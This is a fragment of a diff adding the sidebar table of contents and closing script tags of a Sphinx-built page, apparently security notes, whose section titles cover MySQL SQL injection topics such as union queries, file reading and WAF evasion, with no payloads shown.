+<li><a class="reference internal" href="#and-operator">AND operator (&amp;&amp;)</a></li>
+<li><a class="reference internal" href="#or-operator">OR operator (||)</a></li>
+<li><a class="reference internal" href="#not-operator">NOT operator (!=)</a></li>
+<li><a class="reference internal" href="#operator-precedence">Operator precedence</a></li>
+<li><a class="reference internal" href="#operator-examples">Operator examples</a></li>
+<li><a class="reference internal" href="#php">PHP</a></li>
+<li><a class="reference internal" href="#id1">Injection types</a></li>
+<li><a class="reference internal" href="#mysql-sqli-cheat-sheat">MySQL sqli cheat sheat</a></li>
+<li><a class="reference internal" href="#mysql-fingerprinting">MySQL Fingerprinting</a></li>
+<li><a class="reference internal" href="#login-evasion">Login evasion</a></li>
+<li><a class="reference internal" href="#union-sqli">Union SQLi</a></li>
+<li><a class="reference internal" href="#detect-number-of-columns-with-order-clause">Detect number of columns with order clause</a></li>
+<li><a class="reference internal" href="#detect-number-of-columns-with-union-clause">Detect number of columns with union clause</a></li>
+<li><a class="reference internal" href="#information-schema-database">Information schema database</a></li>
+<li><a class="reference internal" href="#id2">Databases</a></li>
+<li><a class="reference internal" href="#database-in-use">Database in use</a></li>
+<li><a class="reference internal" href="#id3">Tables</a></li>
+<li><a class="reference internal" href="#columns">Columns</a></li>
+<li><a class="reference internal" href="#data">Data</a></li>
+<li><a class="reference internal" href="#privileges">Privileges</a></li>
+<li><a class="reference internal" href="#reading-files">Reading files</a></li>
+<li><a class="reference internal" href="#writing-files">Writing files</a></li>
+<li><a class="reference internal" href="#secure-file-priv">Secure file priv</a></li>
+<li><a class="reference internal" href="#select-into-outfile">Select into outfile</a></li>
+<li><a class="reference internal" href="#waf">WAF</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
